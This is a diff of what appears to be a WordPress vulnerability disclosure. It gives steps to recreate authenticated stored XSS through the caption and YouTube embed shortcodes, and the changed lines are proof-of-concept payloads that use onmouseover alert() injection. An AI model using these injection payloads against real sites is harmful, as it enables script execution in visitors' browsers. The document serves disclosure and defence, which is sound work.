@@ -11,9 +11,9 @@ Steps to recreate:
 2. Either create a new page/post or modify an existing one.
 3. Use the HTML editor to insert code similar to the following and post:
 
-#<a href="[caption code=">]</a><a title=" <Event-attribute-with-JS-code-here>  ">My link</a>
+<a href="[caption code=">]</a><a title=" <Event-attribute-with-JS-code-here>  ">My link</a>
 For my example the code is:
-#<a href="[caption code=">]</a><a title=" onmouseover=alert('XSS!')  ">Link</a>
+<a href="[caption code=">]</a><a title=" onmouseover=alert('XSS!')  ">Link</a>
 When the post/page is opened and a user mouses over this (fake) link, the browser shows an alert box with the word "XSS."
 
 
@@ -32,11 +32,11 @@ Steps to recreate:
 
 If an attacker puts in the following:
 
-#[caption width="1" caption='<a href="' ">]</a><a href=" onmouseover='alert("XSS!")' ">Click me!</a>
+[caption width="1" caption='<a href="' ">]</a><a href=" onmouseover='alert("XSS!")' ">Click me!</a>
 
 WP processes this to become:
 
-#<figcaption class="wp-caption-text"><a href="</figcaption></figure></a><a href=" onmouseover='alert("XSS!")' ">Click me</a>
+<figcaption class="wp-caption-text"><a href="</figcaption></figure></a><a href=" onmouseover='alert("XSS!")' ">Click me</a>
 Like the last vulnerability, when the post/page is opened and a user mouses over this (fake) link, the browser shows an alert box with the word "XSS."
 
 Summary:Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
@@ -51,10 +51,10 @@ Steps to recreate:
 2. Either create a new page/post or modify an existing one.
 3. Use the HTML editor to insert code similar to the following and post-vulnerability through the use of an embed shortcode:
 
- #[embed src='https://www.youtube.com/embed/12345\x3csvg <Event-attribute-with-JS-code-here>\x3e'][/embed]
+ [embed src='https://www.youtube.com/embed/12345\x3csvg <Event-attribute-with-JS-code-here>\x3e'][/embed]
 
 which WP processes to:
 
-#<p>https://youtube.com/watch?v=12345<svg <Event-attribute-with-JS-code-here>></p>
+<p>https://youtube.com/watch?v=12345<svg <Event-attribute-with-JS-code-here>></p>
 Here we demonstrate the vulnerability through the use of an embed shortcode:
 
